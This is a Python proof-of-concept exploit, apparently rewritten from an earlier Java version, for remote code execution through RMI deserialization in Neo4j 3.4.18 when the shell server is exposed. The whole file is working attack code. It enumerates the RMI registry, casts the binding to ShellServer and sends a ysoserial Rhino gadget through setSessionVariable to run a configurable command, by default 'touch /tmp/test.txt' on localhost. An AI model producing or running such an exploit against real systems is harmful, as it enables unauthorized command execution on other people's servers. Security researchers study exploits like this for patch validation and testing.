#!/usr/bin/env python3
"""
neo4j_rce_exploit.py
--------------------
Proof‑of‑concept RMI deserialization exploit for Neo4j 3.4.18
when the old interactive “shell” service is exposed.

* Author(s): Christopher Ellis, Nick Gonella (original Java)
             <you> (Python rewrite)
* Requirements
    - Python 3.8+
    - JPype >= 1.4  (pip install jpype1)
    - The same JARs you used for the Java PoC:
          neo4j-shell-3.4.18.jar
          ysoserial‑all.jar  (rebuilt with the updated Rhino gadget)
    - A vulnerable Neo4j 3.4.18 instance with shell‑server enabled
"""
import sys
import jpype
import jpype.imports
from jpype.types import JInt, JString

# ── CONFIG ────────────────────────────────────────────────────────────────────
COMMAND         = "touch /tmp/test.txt"             # Command to run remotely
TARGET          = "rmi://127.0.0.1:1337"            # Registry URL
TARGET_BINDING  = "shell"                           # Binding name in registry
CLASSPATH       = ["neo4j-shell-3.4.18.jar",
                   "ysoserial-all.jar"]             # Add or edit as needed
# ──────────────────────────────────────────────────────────────────────────────


def start_jvm() -> None:
    """Spin up a JVM (once) with the required class path."""
    if jpype.isJVMStarted():
        return
    jpype.startJVM(classpath=CLASSPATH,
                   convertStrings=False)   # keep JString vs Python str


def check_binding(binding: str, target: str) -> bool:
    """
    List the RMI registry and verify the given binding is present,
    mirroring the helper in the original Java exploit.
    """
    from sun.rmi.registry import RegistryImpl_Stub      # noqa: E402
    from java.rmi        import Naming                  # noqa: E402

    print(f"[*] Enumerating RMI registry at {target}")
    try:
        stub = jpype.JCast(Naming.lookup(target), RegistryImpl_Stub)
        for name in stub.list():
            print(f"    [+] Found binding: {name}")
            if name.lower() == binding.lower():
                return True
        return False
    except Exception as exc:                            # Broad on purpose
        print(f"[-] Failed to list bindings: {exc}")
        return False


def main() -> None:
    start_jvm()

    from java.rmi        import Naming                  # noqa: E402
    from org.neo4j.shell import ShellServer             # noqa: E402
    from payloads        import RhinoGadget             # noqa: E402

    if not check_binding(TARGET_BINDING, TARGET):
        print("[-] Binding not found; shell server may be disabled. Exiting.")
        sys.exit(1)

    print("[+] Binding present, proceeding to exploitation…")
    server = jpype.JCast(
        Naming.lookup(f"{TARGET}/{TARGET_BINDING}"),
        ShellServer
    )

    payload = RhinoGadget().getObject(COMMAND)  # Same gadget as the Java PoC

    try:
        # Equivalent to newClientId() in the original code
        server.setSessionVariable(JInt(1), JString("anything"), payload)
    except Exception as exc:
        # Deserialization tends to raise an UnmarshalException client‑side.
        print(f"[+] Caught (expected) RMI exception: {exc}")

    print("[+] Exploit attempt finished")


if __name__ == "__main__":
    main()
